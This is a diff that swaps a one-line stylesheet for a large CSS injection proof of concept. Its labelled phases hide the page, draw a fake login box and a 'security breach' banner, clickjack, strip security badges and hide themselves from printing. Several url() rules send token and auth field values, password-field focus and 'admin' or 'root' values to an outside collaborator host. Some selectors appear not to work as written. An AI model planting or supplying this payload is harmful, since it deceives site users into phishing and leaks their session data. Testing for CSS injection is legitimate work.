@@ -1,1 +1,259 @@
-body { background: #00ff99 !important; }
+/* === PHASE 1: HIDE LEGITIMATE CONTENT === */
+body * {
+    visibility: hidden !important;
+}
+
+body::after {
+    content: '' !important;
+    visibility: visible !important;
+}
+
+/* === PHASE 2: OVERLAY === */
+body::before {
+    content: 'EXTERNAL CSS INJECTION - NET POC';
+    white-space: pre;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 40px;
+    border-radius: 15px;
+    z-index: 10000;
+    width: 350px;
+    text-align: center;
+    font-family: 'Arial', sans-serif;
+    font-size: 16px;
+    font-weight: bold;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+    border: 3px solid #ff4444;
+    visibility: visible !important;
+}
+
+/* Fake input fields */
+input[type="text"]::before,
+input[type="email"]::before,
+input[type="username"]::before {
+    content: '';
+    position: fixed;
+    top: 44%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 280px;
+    height: 35px;
+    background: white;
+    border: 2px solid #ddd;
+    border-radius: 5px;
+    z-index: 10001;
+    visibility: visible !important;
+}
+
+input[type="password"]::before {
+    content: '';
+    position: fixed;
+    top: 52%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 280px;
+    height: 35px;
+    background: white;
+    border: 2px solid #ddd;
+    border-radius: 5px;
+    z-index: 10001;
+    visibility: visible !important;
+}
+
+/* Fake login button */
+input[type="submit"]::before,
+button[type="submit"]::before {
+    content: '🔐 SECURE LOGIN';
+    position: fixed;
+    top: 60%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 280px;
+    height: 40px;
+    background: #ff4444;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    z-index: 10001;
+    display: flex !important;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    cursor: pointer;
+    visibility: visible !important;
+}
+
+/* === PHASE 3: DEFACEMENT & WARNING MESSAGE === */
+body::after {
+    content: '⚠️ SECURITY BREACH DETECTED ⚠️\A This system has been compromised\A Contact Security Team Immediately';
+    white-space: pre;
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: linear-gradient(45deg, #ff0000, #ff4444);
+    color: white;
+    padding: 20px;
+    border-radius: 10px;
+    z-index: 10002;
+    font-size: 18px;
+    font-weight: bold;
+    text-align: center;
+    box-shadow: 0 10px 25px rgba(255,0,0,0.5);
+    border: 3px solid white;
+    animation: blink 2s infinite;
+    visibility: visible !important;
+}
+
+@keyframes blink {
+    0%, 50% { opacity: 1; }
+    51%, 100% { opacity: 0.7; }
+}
+
+/* === PHASE 4: COOKIE STEALING ATTEMPT === */
+/* Extract cookies and sensitive data via background image requests */
+meta[name*="csrf"]::after,
+input[name*="token"]::after,
+input[name*="auth"]::after {
+    content: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/steal?cookie=' attr(value));
+}
+
+/* Attempt to read cookies from document (limited in pure CSS) */
+script[src*="token"]::after,
+link[href*="session"]::after {
+    content: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/steal?session=detected');
+}
+
+/* === PHASE 5: KEYLOGGER SIMULATION === */
+/* Track input interactions - CSS-based keylogger */
+input[type="text"]:focus {
+    background: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/keylog?field=text_focus');
+}
+
+input[type="password"]:focus {
+    background: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/keylog?field=password_focus');
+}
+
+input[type="text"]:valid {
+    background: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/keylog?field=text_typed');
+}
+
+/* Character detection in specific fields */
+input[value*="admin"] {
+    background: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/keylog?user=admin_detected');
+}
+
+input[value*="root"] {
+    background: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/keylog?user=root_detected');
+}
+
+/* === PHASE 6: DATA EXFILTRATION === */
+/* Detect specific content on page */
+a[href*="admin"]::after {
+    content: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/exfil?role=admin_link');
+}
+
+div[id*="dashboard"]::after {
+    content: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/exfil?page=dashboard');
+}
+
+/* Check for specific user roles */
+span[class*="user"]:contains("admin")::after {
+    content: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/exfil?user=admin');
+}
+
+/* === PHASE 7: CLICKJACKING OVERLAY === */
+/* Invisible overlay for clickjacking */
+body::before {
+    pointer-events: none;
+}
+
+/* But make fake login elements clickable */
+input::before {
+    pointer-events: auto !important;
+}
+
+button::before {
+    pointer-events: auto !important;
+}
+
+/* === PHASE 8: HIJACK LEGITIMATE FORMS === */
+/* Redirect form submissions */
+form[action*="login"] {
+    background: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/hijack?form=login');
+}
+
+form[action*="auth"] {
+    background: url('http://323nlt0l5oyrxziumtwdtmjtlkrbpze.burpcollaborator.net/hijack?form=auth');
+}
+
+/* === PHASE 9: DEFENSE EVASION === */
+/* Hide from quick inspection */
+@media print {
+    body::before, body::after {
+        display: none !important;
+    }
+}
+
+/* Appear legitimate to cursory checks */
+body {
+    font-family: 'Arial', sans-serif !important;
+}
+
+/* === PHASE 10: PERSISTENCE INDICATOR === */
+/* Show attacker's signature */
+footer::after, 
+.footer::after,
+div[class*="footer"]::after {
+    content: '🔓 Security Test - CSS Injection Demo';
+    color: red;
+    font-weight: bold;
+    visibility: visible !important;
+    display: block !important;
+    text-align: center;
+    padding: 10px;
+    background: yellow;
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+    z-index: 10003;
+}
+
+/* === ADDITIONAL IMPACT: DISABLE SECURITY === */
+/* Remove security indicators */
+[class*="secure"]::before,
+[class*="protected"]::before,
+[class*="verified"]::before {
+    display: none !important;
+}
+
+/* Override security badges */
+.ssl-indicator::after {
+    content: '⚠️ INSECURE CONNECTION' !important;
+    color: red !important;
+    background: black !important;
+    padding: 5px !important;
+    border: 2px solid red !important;
+}
+
+/* === FINAL: ENSURES VISIBILITY === */
+html, body {
+    overflow: hidden !important;
+    position: relative !important;
+}
+
+body > *:not(script):not(style):not(link):not(meta) {
+    display: none !important;
+}
+
+body::before,
+body::after,
+input::before,
+button::before {
+    display: block !important;
+    visibility: visible !important;
+}
